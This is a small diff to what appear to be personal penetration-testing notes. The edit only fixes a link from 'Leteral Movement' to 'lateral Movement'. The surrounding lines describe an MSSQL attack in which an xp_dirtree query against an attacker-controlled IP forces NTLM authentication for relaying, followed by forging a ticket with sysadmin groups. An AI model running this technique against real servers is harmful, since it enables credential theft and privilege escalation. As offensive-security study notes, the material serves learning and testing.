@@ -123,7 +123,7 @@ RECONFIGURE
 ```
 
 #### NTLM relay
-the query `EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1` will do a NTLM auth with  10.10.17.231 so we can do a [[skove/notes/windows/70%/Leteral Movement/Leteral Movement#NTLM relaying]]
+the query `EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1` will do a NTLM auth with  10.10.17.231 so we can do a [[skove/notes/windows/70%/lateral Movement/lateral Movement#NTLM relaying]]
 
 you can use the hash to make a sliver ticket and forge your groups to be sysadmin. 
 #### impersonation
